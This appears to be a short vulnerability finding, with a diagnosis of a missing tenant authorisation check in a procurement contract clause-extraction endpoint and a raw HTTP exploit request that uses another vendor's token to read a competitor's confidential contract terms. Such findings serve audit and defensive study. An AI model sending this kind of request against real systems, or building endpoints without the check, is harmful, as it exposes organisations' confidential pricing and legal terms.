diagnosis: The procurement contract analysis endpoint executes a worker process using req.params.contractId without validating whether the requesting organization is a party to the contract. Any corporate tenant can extract confidential pricing tiers, exclusivity covenants, and indemnification caps from contracts belonging to competitor organizations.
exploit_request:
GET /api/procurement/contracts/ctr_enterprise_vendor_2025_44/extract-clauses HTTP/1.1
Host: procurement.internal:8082
Authorization: Bearer <vendor_b_token>
Accept: application/json
